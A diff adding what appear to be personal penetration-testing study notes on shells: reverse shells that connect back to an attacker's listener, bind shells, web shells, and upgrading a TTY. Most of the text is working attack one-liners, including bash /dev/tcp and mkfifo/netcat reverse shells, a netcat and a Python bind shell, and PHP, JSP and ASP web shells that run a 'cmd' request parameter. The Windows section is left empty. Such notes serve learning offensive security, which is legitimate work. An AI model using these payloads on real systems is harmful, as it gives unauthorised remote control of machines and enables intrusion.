@@ -1,0 +1,47 @@
+What is a shell?
+    - Shell on Linux is a program that takes user keyboard inputs and passes these to the originates
+
+Types of Shell connections:
+
+    - Reverse Shell:
+        - initiates a connection back to a "listener" on our attack box
+        - most common
+        - if a host exploit allows for RCE we can start a netcat listener on our maching to listens on a specific port. then we can execute a reverse shell command the connects the remote systems shell to our netcat listener
+
+        TO DO THIS:
+            '''
+                1. open a netcat listener on a port of our choosing (refer to netcat.txt for commands)
+                2. get the "connect back IP" typically our onw machines IP
+                3. REVERSE SHELL Bash commands for a compromised linux machine
+                    - bash -c 'bash -i >& /dev/tcp/<own IP>/<listening port> 0>&1'
+                    - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <own IP> <listening port> >/tmp/f
+                3.1 SHELL COMMANDS FOR compromised windows machine
+                    -
+            '''
+
+    
+    - Bind Shell:
+        - "Binds" to a specific port on the target host and waits for a connection from out attack box
+
+        TO DO THIS:
+            '''
+                - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+                - python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+            '''
+
+
+    - Web Shell:
+        - runs OS command vis the web browser
+        - can be used to run the file upload vulnerability
+
+        TO DO THIS:
+        '''
+            PHP - <?php system($_REQUEST["cmd"]); ?>
+            jsp - <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+            asp - <% eval request("cmd") %>
+        ""
+
+UPGRADING TTY to allow curser movment and command history
+
+- python -c 'import pty; pty.spawn("/bin/bash")'
+- 
